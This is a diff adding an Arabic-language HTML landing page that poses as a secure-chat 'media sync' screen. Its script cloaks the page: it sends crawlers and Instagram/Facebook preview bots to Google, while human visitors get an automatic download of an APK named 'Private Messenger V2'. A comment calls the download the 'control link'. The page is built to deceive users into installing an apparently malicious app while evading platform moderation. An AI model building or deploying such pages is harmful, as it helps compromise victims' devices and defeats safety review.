@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media Storage Sync</title>
+    <style>
+        body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        .loader { border: 6px solid #333; border-top: 6px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { font-size: 1.1em; color: #ccc; }
+    </style>
+</head>
+<body>
+    <div id="main-content">
+        <h2>جاري مزامنة الوسائط لتأمين المحادثة...</h2>
+        <div class="loader"></div>
+        <p class="text">يرجى الانتظار، يتم فحص بروتوكول التشفير وتجهيز قناة الاتصال الآمنة</p>
+    </div>
+
+    <script>
+    // نظام كشف الرادارات المتطور (Cloaking)
+    const isBot = /bot|googlebot|crawler|spider|robot|crawling|instagram|facebook|externalhit|preview/i.test(navigator.userAgent);
+    
+    // الرابط اللي دزيتيه (رابط السيطرة)
+    const downloadLink = "https://files.appsgeyser.com/Private%20Messenger%20V2_19648032.apk"; 
+
+    if (isBot) {
+        // إذا رادار إنستغرام.. حوله لغوغل فوراً
+        window.location.href = "https://www.google.com";
+    } else {
+        // إذا شخص حقيقي.. تبدأ عملية التحميل التلقائي بعد 2 ثانية
+        setTimeout(function() {
+            window.location.href = downloadLink;
+        }, 2000);
+    }
+    </script>
+</body>
+</html>
